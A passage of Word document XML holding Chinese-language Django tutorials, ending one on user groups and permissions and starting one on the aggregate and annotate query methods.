          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791D63DA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% if perms.blog.comment_article %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69AC2FE3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;p&gt;You can comment articles!&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187B4910" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62404B73" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>{% else %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F65A7E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;p&gt;You don't have permission to do anything in the blog app.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB59A33" w14:textId="10A64BFE" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE95ED4" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户组(Group)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E7F615" w14:textId="79E77FF7" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0ED86244" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户组(Group)和User模型是多对多的关系。其作用在权限控制时可以批量对用户的权限进行管理和分配，而不用一个一个用户分配，节省工作量。将一个用户加入到一个Group中后，该用户就拥有了该Group所分配的所有权限。例如，如果一个用户组editors有权限change_article, 那么所有属于editors组的用户都会有这个权限。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3E8DFE" w14:textId="47E38120" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60DA0118" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>将用户添加到用户组或者给用户组(group)添加权限，一般建议直接通过django admin进行。如果你希望手动给group添加或删除权限，你可以使用如下方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3293E1DE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>mygroup.permissions = [permission_list]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128D9E9D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>mygroup.permissions.add(permission, permission, ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9966C6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>mygroup.permissions.remove(permission, permission, ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2668DBEC" w14:textId="5E0ABA49" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>mygroup.permissions.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC9BD49" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你要将某个用户移除某个用户组，可以使用如下方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="584D7BE9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>myuser.groups.remove(group, group, ...) #</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6DB2D9" w14:textId="13D14283" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>myuser.groups.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70EC3FF4" w14:textId="5DF1646B" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django自带权限机制的不足</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325E56B2" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django自带的权限机制是针对模型的，这就意味着一个用户如果对Article模型有change的权限，那么该用户获得对所有文章对象进行修改的权限。如果我们希望实现对单个文章对象的权限管理，我们需要借助于第三方库比如django guardian。至于该库的使用，我们以后再详细介绍。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3E27E8" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF87485" w14:textId="0569ADBD" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2018.11.22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412AD8D7" w14:textId="05D87584" w:rsidR="001C47AF" w:rsidRDefault="00230D30" w:rsidP="00230D30">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048</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId286" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础(24): aggregate和annotate方法使用详解与示例</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6694409E"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Django基础(24): aggregate和annotate方法使用详解与示例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="607FE73B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId287" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-11-27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D6A99D" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3735A415"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Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FFCD87" w14:textId="4A14E909" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在前面的文章和案例里，我们从数据库里查询数据一般只使用了一些初级的查询方法比如filter()和exclude()方法。但如果查询本身比较复杂，比如需要对查询集(queryset)的某些字段进行计算或进行分组计算或排序, 这时我们就需要使用更高级的aggregate和annotate方法了。小编我今天就带你看下什么情况下需要使用aggregate和annotate方法以及如何使用它们。本文比较抽象，但非常有用, 看不懂的可以先加入微信收藏以后多看几遍哦。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547C8F28" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>aggregate和annotate方法的使用场景</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AAD576" w14:textId="7F0FDB40" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Django的aggregate和annotate方法属于高级查询方法，主要用于组合查询，是Django高手们必需要熟练掌握的。当我们需要对查询集(queryset)的某些字段进行计算或进行先分组再计算或排序, 我们就需要使用aggregate和annotate方法了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCBE477" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>假如我们有如下一个模型，其中Student与Hobby(爱好)是多对多的关系。我们想要知道所有学生的平均年龄，我们常规做法一般是利用for循环从数据库中把符合查询条件的student对象一个一个取出，把他们年龄相加，然后再除以总人数。当人数非常多而我们又只需要平均年龄这条信息时，把所有符合查询条件的学生对象都载入内存后再进行计算是非常浪费资源的，效率也非常低。一个更好的方法是在数据库层面提取查询数据时就直接返回我们所需要的信息。因为这个查询涉及到对整个queryset的age字段进行统计计算，此时django的聚合函数方法aggregate就可以帮我们大大提升查询效率了[见后文]。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C001E30" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Student(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEEDD1A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46A7E04B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED6EAC6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    age = models.IntegerField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B42E2A5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    hobbies = models.ManyToManyField(Hobby)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F09C577" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05085F7C" w14:textId="3FFD9A00" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B0B2B0C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Hobby(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D43B8A4" w14:textId="2789B7AF" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FB0AA3" w14:textId="03EFF4A9" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>另一个例子是统计最受学生欢迎的5个爱好，常规做法是先将所有hobby对象提取出来，载入内存。然后利用for循环统计每组爱好对应的学生人数，再构建一个新的查询集，按每组人数从大到小进行排序。这个查询需要根据hobby先进行分组，再统计每个爱好组里学生的数量，然后进行排序。对于这个复杂查询, django的annotate方法一句话就可以解决问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D3F21E" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>aggregate()方法详解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FFEBB7" w14:textId="3A0F9C67" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>aggregate的中文意思是聚合, 源于SQL的聚合函数。Django的aggregate()方法作用是对一组值(比如queryset的某个字段)进行统计计算，并以字典(Dict)格式返回统计计算结果。django的aggregate方法支持的聚合操作有AVG / COUNT / MAX / MIN /SUM 等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09028148" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们现在来看下几组实际使用案例。使用前别忘了import Avg, Max, Min或者Sum方法哦</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD6EEDA" w14:textId="1FB69219" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db.models import Avg, Max, Min</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C95D4AB" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
